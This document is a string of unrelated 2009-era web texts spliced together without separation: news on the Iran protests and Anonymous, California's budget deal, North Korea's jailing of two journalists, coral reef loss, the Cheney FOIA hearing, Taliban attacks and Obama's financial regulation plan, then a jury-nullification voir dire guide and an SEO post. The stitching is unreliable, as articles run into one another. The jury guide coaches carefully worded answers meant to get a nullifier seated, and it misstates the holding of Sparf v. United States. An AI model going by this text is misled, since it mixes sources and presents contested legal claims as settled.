As anti-government protestors clash with Iranian government officials over the re-election of Mahmoud Ahmadinejad , the internet has been buzzing with reports of violence against protestors supporting Mir Hossien Mousavi , the presidential candidate declared the elections loser .
Prior to the elections many , including residents of Iran , believed the political process would work and Mir Hossien Mousavi would be declared the winner .
Many voters opposed a second term of President Ahmadinejad , and by the amount of support Mousavi had , it was believed internationally that Iran would have a new ruling power .
However as results came in , it became apparent the election was rigged .
President Mahmoud Amedinejad was declared the winner , which set off a string of protests throughout Iran .
Social Media and Social Networking have come to play a huge part in getting out information about the protests .
Not only is information being spread to people participating in the protests in Iran , but an international theatre has been set for the entire world to see using the internet .
People in Iran went to using tools such as Twitter and Facebook .
Once the government caught on , they began to shut down and filter the networks .
Anonymous joined the game .
“ Anonymous ” as the group is called has no leader , no structural hierarchy , but is somehow organized .
Made up of every possible profession to include even hackers and business professionals alike , Anonymous has proven in their fight against Scientology , that they are a force to be reckoned with .
“ Anons ” as they have come to be known started Tweeting open Iranian proxies , as well as started a forum http://iran.whyweprotest.net offering advice and help to Iranian protestors as how to surf securely and avoid censorship .
They are also telling Protestors to turn off their cell phones as the government can track them via BT antenna , find , and arrest them later .
A link was also posted of proxies that the Iranian Government is using to get around their own firewalls .
Anonymous is not going to pull any punches , they have never done so .
Under the guise of Anonymity , their numbers are strong .
Cells of Anonymous are willing and prepared to fight this fight , they do not let tyranny go un-punished or unreported .
Many journalists and US supporters of the protests have reported they have been threatened by the Iranian government .
Since “ Anons ” are “ Anonymous ” and they know how to remain that way in the digital world , if they stick to their guns , we can see a whole new digital revolution , one that just might help change the world .

Gov. Arnold Schwarzenegger and legislative leaders announced Monday that they had reached a deal to close California ’s $ 26.3 - billion deficit and begin paying all of the state ’s bills again , potentially ending months of partisan wrangling and a cash crisis that threatens to push California into insolvency .
Their agreement , which could go before the full Legislature within days , does not include any broad - based tax increases , relying instead on deep cuts in government services , borrowing and accounting maneuvers to wipe out the deficit .
The plan has not been formally released .
But as outlined by lawmakers and their staffs , the proposal would reshape some aspects of government in California , significantly scaling back many services that have been offered to residents -- particularly the elderly and the poor -- for years .
Tens of thousands of seniors and children would lose access to healthcare , local governments would sacrifice several billion dollars in state assistance this year and thousands of convicted criminals could serve less time in state prison .
Welfare checks would go to fewer residents , state workers would be forced to continue to take unpaid days off and new drilling for oil would be permitted off the Santa Barbara coast .
“ We ’ve accomplished a lot in this budget , ” said Gov. Arnold Schwarzenegger , as he emerged from his office with legislative leaders shortly before 7 p.m. to announce the deal , after an all - day negotiating session of the “ big five ” -- the governor and legislative leaders .
“ It was like a suspense movie , but . . . we have accomplished a lot , ” the governor said .
“ This is a budget that will have no tax increases , a budget that is cutting spending .
. . .
We ’re also very happy that in this budget we make government more efficient . ”
Democrats , who initially sought tax increases , said they had managed to ward off cuts proposed earlier by Republicans that would have been catastrophic to the state ’s social safety net .
“ We have cut in many areas that matter to real people , but I think we have done so responsibly , ” said Senate leader Darrell Steinberg ( D - Sacramento ) .
“ This is a sober time . ”
It is not clear whether the package will pass when lawmakers vote on it , perhaps Thursday .
Concern that it could unravel as interest groups catch wind of its contents and pressure the rank - and - file to vote it down was evident in legislative staffers ’ reluctance to share some details .
No one involved in the negotiations would explain how $ 1.2 billion would be cut from the state prison system .
Law enforcement advocacy groups said that level of reduced spending could require the release of as many as 20,000 prisoners before their sentences are complete .
It is also unclear how long the proposal would keep the state ’s budget balanced .
The plan is full of expense deferrals , one - time measures and assumptions that invite a deficit to reemerge .
The governor and lawmakers assumed the privatization of the State Compensation Insurance Fund would generate $ 1 billion , for example , but few , if any , experts believe such a sale is possible this year .
And the plan would save $ 1.2 billion by waiting until a new fiscal year begins before sending out one scheduled batch of paychecks to state workers , a clear accounting scheme .
Further , finance officials say the continued plunge of tax revenues could bring on another shortfall before year ’s end .
“ There will be more work to be done , ” said Assembly GOP Leader Sam Blakeslee ( R - San Luis Obispo ) .
“ The recession is not over . ”
Monday night ’s compromise followed weeks of meetings in the governor ’s office and comes amid one of the worst cash crises in state history .
Finance officials have been sending out hundreds of millions of dollars in IOUs because the state does not have enough cash to pay all of its bills ; it is only the second time that has happened since the Great Depression .
California ’s credit rating has dropped to its lowest level in many years , teetering just above junk status .
State Treasurer Bill Lockyer has warned that failure to put a budget in place quickly could hurt California ’s standing on Wall Street so much that it would be unable to access the cash it needs to build schools and roads .
The budget package , according to those who worked on it , is expected to hit local governments particularly hard .
It would raid municipal funds for $ 1.9 billion , mostly county money .
The funds must be paid back , with interest , in three years .
But local leaders say they need the money now , having endured their own excruciating budget cuts triggered by steep declines in local tax receipts .
They say Sacramento ’s reductions will force them to slash the services they provide , adding more pain on top of the state cutbacks .
Cities and counties would lose another $ 1 billion in transportation money under the proposal , and the state is also seeking at least $ 1.7 billion -- and possibly billions more -- from local redevelopment agencies .
Lawmakers will also be given the option to greenlight a controversial plan that would give some local redevelopment agencies broad new discretion to tear down and rebuild neighborhoods under their jurisdiction for decades to come , regardless of whether those areas are blighted .
“ It ’s bad public policy and it is going to hurt a lot of people , ” Los Angeles County Supervisor Zev Yaroslavsky said of the budget plan .
Education would also lose billions of dollars , although the deal skirts suspension of voter - approved funding formulas .
Schools are expected to have to increase the number of students in classes , lay off teachers and scale back their offerings .
Education lobbyists won a provision that requires the state to ultimately pay back money it is cutting , but districts are struggling now .
Fees at the state ’s universities were already raised in anticipation of the deal .
The number of students admitted would be reduced by thousands .
And university employees are facing unpaid furloughs .
They would join California ’s 230,000 - plus state workers who will continue to be forced to take off three unpaid days per month through June 2010 .
The furloughs equate to roughly a 14 % pay cut for state employees .
California ’s largest public employee union , angered by the furloughs , is currently polling its membership about a strike .
Advocates said the cuts to healthcare and social services -- while scaled back from what the governor originally proposed -- would be devastating .
“ Millions of Californians will live sicker and die younger as a result of these cuts , ” said Anthony Wright , executive director of the nonprofit Health Access California .
He called the plan a cause for “ embarrassment and shame for California . ”
Work requirements under the state ’s welfare program would be increased , forcing many recipients to drop out .
Emergency cash grants intended for the children of families not meeting those requirements would be eliminated for the first time .
Entire groups of seniors currently eligible to receive healthcare in their homes no longer would be .
Those that are eligible would be fingerprinted , an effort to eliminate fraud .
Other changes in the budget are more symbolic .
Legislative leaders agreed to a Schwarzenegger demand to eliminate the state Integrated Waste Management Board , long known as the home of six - figure - salaried political appointees , including three ex-lawmakers currently serving .
The board ’s functions -- minus the high - paid appointees -- will continue .

SEOUL ( Reuters ) - North Korea found two U.S. journalists it has held since March guilty of illegal entry and sentenced them to 12 years hard labour , its official KCNA news agency said on Monday .
The journalists , Euna Lee and Laura Ling , of U.S. media outlet Current TV , were arrested while working on a story near the border between North Korea and China .
Their trial opened on Thursday .
“ The trial confirmed the grave crime they committed against the Korean nation and their illegal border crossing as they had already been indicted and sentenced each of them to 12 years of reform through labour , ” KCNA said in a brief dispatch .
Experts say North Korean law dictated a sentence of 10 years or more of hard labour .
Analysts said the two have become bargaining chips in high - stakes negotiations with the United States , which has long sought to end the North ’s nuclear ambitions .
Preparing for Jury Duty Jury duty is as important to citizenship as voting - maybe more so .
Certainly , a citizen has more influence and power when serving as a juror than as a voter .
It is in the jury room that citizens get to actually influence the system to work toward Americans ' highest commonly held political values . . . the values we pledge to when we pledge allegiance to the flag of the of the United States of America , and the Republic to which it stands : Liberty and Justice for All Jury duty is a serious responsibility .
In most civil cases , decisions that juries make in contradiction to the rules laid out by the law and the court can and will be overturned by the judge or the appeals process .
The role of a civil court jury is to do justice in disputes between parties .
The doctrine of jury independence is primarily aimed at protecting individuals from governmental abuse .
That is the domain of criminal trials ( and civil trials where government is suing ) .
So , if you are on a normal civil trial , do the best you can for justice within the directions of the court .
If you are in a criminal trial , in the vast majority of cases , the law will be just , and justly applied , and the jury 's role will only to determine guilt or innocence and , if guilty , sentencing .
Once again , the court 's instructions will help justice be done .
But , you may actually get on a jury of one of those rare cases where the law is a good one , but is being applied in an unjust way .
Or rarer still , where the law , itself , is unjust or unconstitutional .
That is when you must decide whether to follow the government when it is doing wrong - or your conscience .
Or decide to follow the peer pressure of other jurors - or your conscience and hang the jury , if you must , to see that justice is done and liberty preserved .
It is when your moral code tells you that what the government is attempting to do in the trial is wrong that you have to remember your role as a juror .
As a juror , you are a representative of the people of your state and the nation .
In America , the people rule .
The judge is your employee and advisor , albeit one to be respected as a learned and powerful .
The judge has spent a lifetime studying the law , and should be given a respectful hearing .
The judge also has the power to put you in jail for certain inappropriate behavior .
But the judge cannot jail you for voting your conscience in the jury room .
That is a power that has been respected for centuries as the essence of what the jury is all about .
One of the major roles of the jury is to serve as a board of directors for the government , reviewing how the employees of the people in the government are doing .
One of your major roles as a juror is to make sure the government does not go too far .
To make sure that liberty and justice for all is maintained .
Review of the law and its application is the reason why the jury system was formed in the first place .
The nobles who forced the king to write jury power into the Magna Carta did not do it because they thought that they were better judges of fact than the court .
They did it as a way to protect themselves from arbitrary application of power by the government .
Because current Texas law allows prospective jurors to be challenged and struck from the jury simply because the citizen is opposed to the law being prosecuted , fully informed and conscientious citizens may have difficulty being seated .
The article below discusses the jury selection process .
Surviving Jury Voir Dire By Clay S. Conrad
How can FIJA advocates keep from getting kicked off of juries , by the Judge or by the Prosecutor ?
Frustrated FIJistas regularly report being excluded during voir dire ( jury selection ) .
But if our advocates can't get seated on juries , FIJA is limited in its ability to affect the law , or to see justice done in SPITE of the law .
Voir Dire , which is French for " to speak the truth , " consists of having the Judge , the Prosecutor and the Defense Attorney each ask the jury a series of questions .
It exists for two reasons .
For the most basic , it allows the Court to find and eliminate partisans - the Defendant 's brother , the arresting officer , etc .
Going down the excludability ladder , it allows both sides to challenge jurors for bias , for familiarity with facts or witnesses , etc .
The rules for exclusion of jurors are spelled out in the Code of Criminal Procedure ( CCP ) .
First , FIJA members should realize that some veniremembers are absolutely disqualified .
For instance , if a veniremember is under 18 , or is not a citizen of Texas , the veniremember may not legally serve .
The Court is required to exclude such jurors from service .
More importantly , veniremembers may be challenged FOR CAUSE .
These challenges are unlimited in number , and are spelled out in CCP Art. 35.16 .
A juror may be challenged for cause if he : 1 . Is not qualified to vote ; 2 . Has been convicted of a theft or felony ; 3 . Is under indictment or other legal accusation for a theft or felony ; 4 . Is insane ; 5 . Has " such a defect in the organs of feeling or hearing , or such bodily or mental defect or disease as to render him unfit for jury service , or that he is legally blind , and the Court in its discretion is not satisfied that he is fit for jury service in that particular case " ; 6 . Is a witness in the case ; 7 . Served on the Grand Jury which indicted the defendant ; 8 . Served on a Petit Jury in a former trial of the case ; 9 . Has a bias or prejudice in favor of the State or the Defendant ; 10 .
Has established a conclusion as to the guilt or innocence of the defendant that would influence him in his action in finding a verdict ; 11 .
Cannot read or write ; 12 .
Is related to either the defendant or the victim ; 13 .
In a capital case , has conscientious scruples in regard to the infliction of the death penalty ( only to be used by the Prosecution ) ; or 14 .
Has a bias or prejudice against any of the law applicable to the case .
If the Judge finds the challenge to be good , he MUST exclude the juror .
It is not discretionary ; failure to exclude will be reversible error .
Additionally , both the Prosecution and the Defense have a limited number of PEREMPTORY CHALLENGES .
In a misdemeanor case , both sides have three , in most felonies , ten , and in capital cases , both sides have fifteen .
Peremptory challenges may be exercised for any reason or for no reason whatsoever , EXCEPT that they may not be used to exclude women or minorities from the jury merely because of their gender or race .
( See CCP 35.261 , Batson v. Kentucky , 476 U.S. 79 ( 1986 ) ) .
Peremptory challenges are used to " stack " the jury , as well as the attorneys are capable of ( they attempt to get people whom they believe are friendly to their side , by excluding the ones they believe will be really bad to their side . )
Many lawyers believe that the intelligent use of peremptory challenges is the most important skill of a good trial lawyer ; yet research shows that few lawyers are good at it .
Perhaps that is something to be glad about ; try as they may , most jurors will not be so plainly " defense " or " prosecution " jurors that voir dire is much better than a crap shoot .
It certainly is frustrating for a veniremember , especially a FIJA member , to be excluded from jury duty .
They have taken time from work , have submitted themselves to questioning , and have been rejected - almost always taken as a personal affront .
Yet FIJA members often have only their own eagerness to blame for their exclusion , as I have tried in my answer to the E - Mail post below .

The FIJA got me out of jury duty too .
[ Here is ] the transcript [ of my dismissal ] : Judge :
Is there anyone here that believes that they should not follow the instructions of law given to them by the court .
Me : Yeah , I guess I do .
You mean the fully informed Jury ?
Judge : Hold on , sir .
I do n't want you to taint the panel .
I 'll just ask you a couple questions .
he asked my name and juror # Judge : okay , Mr. LZ , you heard me explain -- you believe that you would not --- and you have to answer yes or no , because I do n't want to taint the panel .
You would not be able to follow the instructions of law given to you by the court ?
Just answer yes or no .
Me : Depends if I think the law is legal .
Judge : Well , all right .
And I 'm saying to you , it 's not your judgment of what the law may be .
The court 's responsibility to tell you what the law is ---- Me : Not if I 'm in a jury .
It 's my responsibility .
Judge : Okay , well , I think we 've heard enough from you , sir , in terms of your responsibility .
You 're not giving me direct answers .
The answer I 'm asking you is if you say to yourself and tell me , " Judge , I know you have responsibility to tell me what the law is , but the fact that you 've told me what the law is is n't going to change my mind at all .
I believe that I have an absolute right to determine what the law is . "
Is that your position ?
Me : That 's right .
Judge :
All right .
Thank you .
Then we 'll excuse number 48 .
Report back to the jury commissioner .
Okay ,
We 're not --- we 're not being incriminatory to anyone or condemning anyone 's beliefs , but that 's the only way we can operate .

Now think of this in light of John Adams , our second president who had this to say about jurors : " It is not only his right , but the duty .... to find the verdict according to his own best understanding , judgment , and conscience , though in direct opposition to the direction of the court . "
In 1895 , the U.S. Supreme Court formally recognized jury nullification in Sparf vs. United States .
The court held that juries have the power to return verdicts contrary to law and evidence .
Taken from the Arizona Republic by Richard Lessner Deputy Editor of the Editorial Pages .
I was denied the right to serve on a jury by this judge and would like to know where I should go to file a complaint .

It does not appear that you wanted to serve on the jury .
In voir dire , if you intend to serve , the less said , the better .
And if you do want to make a speech in voir dire , it should be aimed at informing the other jurors as much as possible .
Finally , the juror does not determine what the law IS , so much as he determines whether the law should or should not be applied in the case before him .
Even the best laws can be misapplied , and when misapplied should be nullified .
There is no human way to write a law so complete and perfect that an ambitious prosecutor can't find an excuse to charge a morally innocent person with its violation ...
As for any " violation " of your rights because you were excluded as a juror , do n't waste your time .
The rights involved belong to the people on trial , not to the jurors , with one exception : racial or gender discrimination in jury selection ( " Batson " violations . )
The Court has every right to exclude someone who has made themselves excludable under the Code of Criminal Procedure .
I do n't know the specifics for your state - or even what state you are in - but I do know enough to assert that any Court in America will exclude a juror who answers as you did !
HINT : NEVER mention FIJA in voir dire .... NEVER answer more than the bare minimums .
If the judge asks if you " CAN " do something , always answer yes if the action would be physically possible to you ... he did n't ask if you WOULD ...
After you are seated , if you believe nullification is an appropriate response , tell the other jurors that you do not believe the defendant is guilty , because you do n't believe the law should be applied in this case , and tell them why .
Then try to show them that they have the power to do what is right , and that that is why we have trial by jury .
Do n't quote , do n't rely on authority .
They can't check your quotes or look at the authorities .
Talk to them as one individual to another ( 11 ) , and put the doctrine in your own words .
Convince the other people prone to vote to acquit that a hung jury is not a bad outcome , if the panel disagrees .
A compromise - voting for conviction when not convinced beyond a reasonable doubt , or voting guilty on lesser charges in order to short - circuit the process and go home - IS a bad outcome , and is very much a violation of their duty .
Juries are empowered to HANG , but never to COMPROMISE .
What needs to happen is for people to get to sit on juries who know something about nullification , and then to politely bring other jurors - who believe that an injustice is being done - around to an understanding of the power which is in their hands .
If you are lucky , the defense attorney should have given you all the ammunition you need , while in closing arguments , voir dire , etc. COURTS DO NOT LIKE TO EXCUSE JURORS .
What they want to avoid is " busting the panel , " excusing so many jurors for cause that they do n't have enough left to try he case .
If you avoid a dogmatic posture , and if you are respectful and say the minimum , chances are the Court will not find cause to excuse you .
( You may still be struck with a peremptory challenge ; even if you had not been struck for cause , I am sure , in your case , that the prosecutor would have sent you out of their expeditiously anyway .
So , so far as you were concerned , there was no harm done . )
Let me give you a few examples of how the answers could have gone .
1 > Judge :
Is there anyone here that believes that they should not follow the instructions of law given to them by the court ?
FIJA jurors can't know whether they should follow the instructions of law until they have heard the case and the instructions .
AS A GENERAL RULE , the instructions probably SHOULD be followed .
We should assume the system to be just until proven otherwise .
So we should , AS A GENERAL RULE follow the instructions of the court , and therefore I would not raise may hand in response to this question .
2 > Judge : okay , Mr. LZ , you heard me explain -- you believe that you would not --- and you have to answer yes or no , because I do n't want to taint the panel .
You would not be able to follow the instructions of law given to you by the court ?
Just answer yes or no .
FIJA jurors would be ABLE to follow the instructions ; whether they WOULD do so is another question , and not one the court asked .
So the answer to this is no , it is not true that you would not be able to follow the instructions ... got it ?
3 > Judge : Well , all right .
And I 'm saying to you , it 's not your judgment of what the law may be .
The court 's responsibility to tell you what the law is ---- LZ : Not if I 'm in a jury .
It 's my responsibility .
Here , you are being combative , when if you had answered either of the above questions more discreetly , this question would never have been almost asked - I say almost because you never let the Judge finish .
And you are WRONG .
It IS the court 's responsibility to tell you what the law is ; it is your responsibility to decide whether the law should be applied - whether to convict or acquit .
4 > Judge : Okay , well , I think we 've heard enough from you , sir , in terms of your responsibility .
You 're not giving me direct answers .
The answer I 'm asking you is if you say to yourself and tell me , " Judge , I know you have responsibility to tell me what the law is , but the fact that you 've told me what the law is is n't going to change my mind at all .
I believe that I have an absolute right to determine what the law is . "
Is that your position ?
LZ : That 's right .
This is a misstatement of the jury nullification doctrine .
The juror does not have an absolute right to determine what the law is in every instance .
For example , if a person is innocent according to the Court 's instructions , the juror does not have a right to CONVICT .
Nullification is a doctrine of mercy , not of anarchy .
Secondly , the juror should listen to what the Court says ; he should not determine before hearing what the court says that it wo n't change his mind at all .
Many jurors may have their minds changed and decide TO nullify after hearing the Court 's charge .
---------
Even worse , your answers were unenlightening to the other jurors .
They probably just dismissed you as a kook , without knowing why you were being so adamant or what you were being adamant about .
You speak of your responsibility , without explaining anything about that responsibility : a better answer ( for someone who wanted off the jury ) would have been : it is my verdict , your honor , and that is a serious responsibility .
I could not participate in committing injustice , if following the law led to an unjust result .
THEN the Court would have to deal with either a jury of nullifiers , or dismiss the entire panel - a wasted day in Court , which the Judge would not want to have to deal with ...
The most important thing , in the end , was the DEFENDANT .
Did your attitude and actions make it more or less likely that he would have at least one potential nullifier on his jury ?
I would say less likely - you got kicked off - and he may well have been unjustly convicted .
Perhaps remembering that a morally innocent man may well be sitting in prison , being beaten and raped by his cellmates while his wife files divorce papers against him and his family goes on welfare may somewhat blunt your sense of self - righteousness in so belligerently challenging the Court .
Without having to have told one lie in Voir Dire , you could have arranged to have been seated in that case - just say the minimum and answer honestly , candidly , but precisely !
And that man - a victim of the system - would still have his life in one piece .
Think about it ...
___________________________________________________________________________
Consider what is at stake here .
A FIJA advocate may choose to spout off in voir dire , in order to teach that pesky judge a thing or two ... or he or she may choose to wait until jury deliberations start , and then REALLY teach the judge a thing or two ...
Which is more effective ?
Which approach would you want the veniremember to take , if YOU were on trial ?
FINAL COMMENT : I AM NOT ADVOCATING HAVING ANYBODY EVER , UNDER ANY CIRCUMSTANCES , LIE DURING VOIR DIRE .
If you are forced to announce that you are a FIJA member ( Have any of you ever heard of the Fully Informed Jury Association ? ) , admit it .
But answer very , very carefully ... if asked if you are a member of the organization , but have never officially joined , or if your dues have lapsed , the answer would be NO .
Say nothing !
And if you must answer a question which will lead to your being excluded , blurt out as much about the doctrine as you can !
Try to make sure that every single veniremember knows as much as possible about jury independence , and that under NO circumstances must a jury commit injustice .
You may " bust " the panel ; you may force the Judge to send them all home , and you may even get seated on the jury ( the judge may be embarrassed to disqualify a juror who has stated he believes in justice , and count on the Prosecutor to use a peremptory challenge on you . )
Just remember that a criminal trial is not the place for political grandstanding or membership recruitment .
Our goal here is not to convert , not to show off , and not to challenge the authority of the Judge or Prosecutor , but to see JUSTICE done .
Keep your eyes on the prize , and when you get on that jury , do the right thing !
Two fifths of the planet 's most significant marine environment , a stunning expanse of coral reefs stretching across south - east Asia , has been lost and the rest is set to disappear by the end of the century , a World Wildlife Fund report warns .
Pollution , overfishing and climate change is destroying the area known as the Coral Triangle , which covers an area about half the size of the United States and is home to more than 30 % of the world 's corals and more than 35 % of coral - reef fish – around 3,000 species .
" More marine species exist in the Coral Triangle than are found in all the other tropical oceans put together , " the report , The Coral Triangle and Climate Change , says .
Within this biological wonderland – which spans Indonesia , Malaysia , Papua New Guinea , the Philippines , Solomon Islands and Timor - Leste – are 18,500 islands rich in mountain forests and woodlands .
The escalation of modern practices , such as deforestation , coastal reclamation , destructive fishing and the pumping of pollution and sewage into sea , over the last 40 years have already destroyed about 40 % of coral reefs and mangroves in this unique environment .
If such practices are unchecked , half the species in the Coral triangle will continue to disappear at a rate of 1 - 2 % a year .
" You do n't have to be a brain surgeon to see that within 40 years we could lose the rest .
This may sound alarming but this is not alarmist .
This is probably what we are going to experience if we do n't get our act together , " said Professor Ove Hoegh - Guldberg , writer of the report and director of the Centre for Marine Studies at the University of Queensland .
Based on a review of more than 300 peer - reviewed scientific studies in fields such as biology , economics and fisheries , the report also predicts a dark future for the six nations within the Coral Triangle – and the surrounding the area .
Of the 150 million people who live across this string of islands , about 100 million depend on the mangroves and seagrass beds for food and building materials .
The reefs , which also support industries such as fishing and tourism , are also the nursery for numerous fish species .
The report paints two future scenarios .
The worst case would be if the global agreement to cut carbon emissions , signed in Copenhagen in December , fails significantly and carbon emissions continue apace .
This would , the report predicts , result in region being struck increasingly by severe drought , typhoons and political unrest .
Food supplies would shrink , being halved by 2050 and cut by 80 % before the end of the century , while fresh water supplies would be swamped by rising sea levels .
Thousands of people would be forced to migrate from the coast to increasingly impoverished and crowded urban areas inland .
Traditional cultural and family structures would be likely to break down as a result and large numbers of people would flee to nearby neighbours such as Australia and New Zealand .
" Reduced food and water security and the resulting social disruption represents a potent threat to regional security , " the report says , predicting that a process of radicalisation is likely among those who stay in the region .
But even bleaker is the stark warning in the report that " the pathway that the world is on today exceeds the worst - case scenario described in this report " .

Saving Cheney from ' The Daily Show ' ?
Wrap your head around this :
The Obama administration wants to save former Vice President Dick Cheney from the likes of " Daily Show " host Jon Stewart .
That was the thrust of arguments the Justice Department presented Thursday seeking to prevent the release of an interview Cheney gave in 2004 to Special Counsel Pat Fitzgerald as part of his investigation into the leak of the identity of CIA operative Valerie Plame Wilson .

In an afternoon U.S. District Court hearing in Washington , Judge Emmet Sullivan presided as Justice Department attorney Jeffrey Smith defended the government ’s refusal to release the details of the Cheney interview .
David Sobel , an attorney for the group suing for the documents , Citizens for Responsibility and Ethics in Washington , was there to argue in favor of disclosure .
Here ’s how it went :
Sullivan asked if President Barack Obama ’s appointees stood by the Bush administration ’s steadfast refusal to make the Cheney interview public , noting , “ there ’s a new administration . ”
“ This has been vetted by the leadership offices , ” Smith said .
“ This is a department position . ”
“ It is disappointing that the new administration apparently is picking up where the old one left off , ” said Sobel .
Smith argued that allowing Cheney ’s interview to become public could have a “ chilling effect ” on the willingness of future vice presidents and presidents to cooperate with law enforcement investigations .
“ Says who ? ” Sullivan asked .
Smith said that was the conclusion of Attorney General Michael Mukasey , who was in office at the time briefs were filed in the case last year .
However , the only formal statement the government presented in its papers was from Bush Justice Department official Stephen Bradbury .
“ Bradbury ’s a political appointee .
I do n’t know what his experience was , ” Sullivan said skeptically .
“ It ’s just an assumption this man makes .
...
He did n’t talk to the vice president . ”
“ What the Justice Department does n’t want is to become an information - finder for the president and vice president ’s political enemies , ” Smith added .
“ We do n’t want future vice presidents to see us as the conduit to them being mocked . ”

“ The government does n’t want to have what ’s in these documents end up on a late - night comedy show , ” Sullivan said .
A key legal question in the case is whether the potential for future investigations of the White House is too speculative to permit withholding records under the Freedom of Information Act .
Sobel argued that the government ’s stance would render the records of any kind of White House - related investigation off limits to the public — not just an inquiry into a sensitive issue like the disclosure of classified information .
“ The argument would apply to a murder in the White House , selling drugs in the White House , bribery in the White House , ” Sobel said .
“ We would be carving out the White House ... for special treatment . ”
Sobel also said it was " unseemly " for the court or the Obama administration to be predicting that there would be illegal activity involving White House officials .
Smith said the prospect of a future inquiry at the highest levels of government was far from speculative .
“ It has happened in every administration in the last 30 years , unfortunately , ” he said .
Sobel ’s client , CREW , has aligned itself with Cheney ’s political opponents .
The group represented Valerie Plame Wilson and her husband Joseph Wilson in a civil lawsuit against Cheney and others over the leak .
The case was dismissed .
Sullivan did n’t decide immediately whether the summary and notes of the Cheney interview should be made public , but the judge said Bradbury ’s declaration was inadequate to justify withholding the records .
He ordered the Justice Department to supplement its filings by July 1 and to produce the documents for him to examine in private .
Five Afghan security personnel have died in a series of Taliban strikes in eastern Afghanistan , officials say .
Gunmen and suicide bombers targeted four sites in the city of Gardez , among them the governor 's compound .
Four bombers were reported killed .
During an attack in Jalalabad , near the Pakistan border , at least one militant was killed and another captured .
The battles come amid a spike of violence in the country ahead of elections on 20 August .
Taliban militants have carried out similar co-ordinated attacks on provincial cities in recent months .
In May , six people were killed when militants launched simultaneous assaults on government buildings in the city of Khost , also in eastern Afghanistan .
Shootout
In Gardez , the militants attacked the police chief 's office , a police station and the intelligence directorate , as well as the governor 's compound , Afghan officials said .
A Taliban spokesman said 15 militants , all wearing suicide vests , planned to launch attacks in the city .
Afghan officials refused to comment on that claim .
Afghanistan : Taliban tactics Reports said at least two of the attackers carried their bombs underneath burkas , the all - enveloping dress often worn by Afghan women .
A local trader said there was panic and confusion .
" I was at my shop and I suddenly heard a loud explosion and then gunshots .
I saw fire being exchanged between the police and attackers , " the trader told the BBC .
In a statement , the defence ministry said four militants were killed in a shootout and two blew themselves up .
Officials confirmed to the BBC that five Afghan security personnel had been killed .
An Afghan doctor at the hospital in Gardez told the BBC he had received four bodies , all of military personnel .
Meanwhile in Jalalabad at least two militants tried to attack an airport which is a base for Afghan and foreign troops .
Nato - led forces said one blew himself up and another was captured .
An Afghan official said one policeman was killed , but that was not confirmed .
Troops ' must stay ' Earlier , a British soldier was killed in an explosion in Helmand province in the south of the country .
He was the 18th British soldier to be killed in Afghanistan this month .
The deaths of four US soldiers were announced on Monday .
Also on Monday , Nato head Jaap de Hoop Scheffer warned that walking away from the war would have a " devastating " effect , allowing extremism to overwhelm Afghanistan and spread further into Pakistan and Central Asia .
The fight in Afghanistan , he said , was essential to the security of Nato members .
" Those who argue otherwise - who say we can defend against terrorism from home - are simply burying their heads in the sand , " he said .

There is much to worry about in President Obama ’s financial regulation proposal , officially unveiled on Wednesday .
It ’s a long wish list , but intense and nontransparent financial sector lobbying already ensured that four out of the five sets of measures are unlikely to have any lasting positive impact .
As Stephen Labaton reports :
“ In the last two weeks alone , the administration has heard from top executives from Goldman Sachs , MetLife , Allstate , JPMorgan Chase , Credit Suisse , Citigroup , Barclays , UBS , Deutsche Bank , Morgan Stanley , Travelers , Prudential and Wells Fargo , among others .
Administration officials also discussed the president ’s plan with the top lobbyists at major financial trade associations in Washington . ”
What is the outcome of all this behind - the - scenes maneuvering to get the financial sector fully on board ?
Not much change that we can really believe in .
For example , take the points that President Obama himself stresses ( e.g. , in this interview ) .
First and foremost , he says the Federal Reserve will become the official “ system risk regulator ” ( section 1 of his proposal ) .
But in principle the Fed had exactly this kind of leadership role before — and under both Alan Greenspan and Ben Bernanke it was a reckless cheerleader and facilitator for the unsustainable real estate boom .
If the Fed had been stronger before , the crisis now would be worse .
Hedge funds and other private pools of capital have to register with the Securities and Exchange Commission , also in section 1 .
But the once - proud S.E.C. has fallen on hard times , effectively just as much captured by the intellectual bubble of Wall Street as all our other regulators .
Originators of securitized products will be required to retain some stake in what they issue ( section 2 ) .
But the major shock of early 2008 was when we learned that Bear Stearns , Lehman Brothers , and others had done exactly that .
There is no serious attempt here to recognize that our leading financial firms have completely failed in their efforts to measure and control risks .
In addition , the administration will now seek a “ resolution authority ” that makes it easier to take over and shut down large financial companies ( section 4 in the proposal ) .
But effectively they had this power before — Continental Illinois , for example , was handled as a negotiated conservatorship in the 1980s , and Citigroup could have been taken over at various points in the past nine months .
The government blinked in the face of financial sector complexity and scale .
“ Too big to fail ” is “ too big to exist , ” but the president ’s document goes nowhere near this fundamental principle .
And while the proposal is no doubt right to emphasize the need for international cooperation in re-regulation , section 5 is so vague as to be meaningless .
There is , however , one interesting piece — the creation of a Consumer Financial Protection Agency ( section 3 ) .
The president himself seems to recognize that previous consumer protection was scattered and ineffectual .
A strong agency could help protect us all both in boom times and during crises .
But protecting consumers is not the same thing as protecting investors and taxpayers .
Major financial players will once again be able to float bubbles , creating the illusion of growth and the reality of further expensive bailouts .
Our financial sector has become very powerful politically — and these proposals are a further sad reminder of that fact .
Gather round soldiers , up 2 , 3 , 4 , up 2 , 3 , 4 … We are on a covert mission to discover whether there is any weight or value placed on keywords in bold and italic tags .
The final objective of this mission is not only to debunk myths but with your help and comments to finally bury them .
The value in regards to SEO is not the only factor that we will be analysing , the effect bold and italic tags has on usability and their ability to convert customers will also be considered .
Halt … .
Attention :
Beliefs are split into two camps ; some people believe that the bold tag is now ineffective whereas others still believe it holds value .
Within the SEOmoz ranking factors , the contributors ( various respected industry figures ) draw the conclusion the bold tag has a moderate importance .
Opinions and attitudes here range from “ Has some weight as a ranking factor , but not very much ” , “ I ’m still doing it sometimes , but I ’m really starting to wonder why ” to “ We focus on communication to the user ; we never bold terms in an effort to rank for them ”
These opinions contrast particularly to the views from 3 - 4 years ago , where contributors to the SEOmoz ranking factors ( 2005 ) commented : “ I think that this is still very important ” and “ H1 and BOLD are still vital indicators of important factors . ”
The belief was the algorithm used to determine that any keyword placed within a bold tag would be given value as to determining what the page is about .
The question is , has Google now realised this was being manipulated for the search engines and not for the user as was its original intention ?
Additionally , is the bold tag now obsolete ?
Why and How to utilise the bold tag
Personally I believe that the bold tag still holds slight value and should be incorporated within on - page content .
Search engines spiders can read and understand html code so it seems logical that the assigned keyword within a bold tag would carry a degree of importance to the page .
This question still remains to be decided whether it carries any ranking weight but undeniably it does carry visual weight .
The usability of a website is a big feature of converting visitors into customers .
Bold tags are vital for catching readers that scan , reinforcing the belief that they have found the right page .
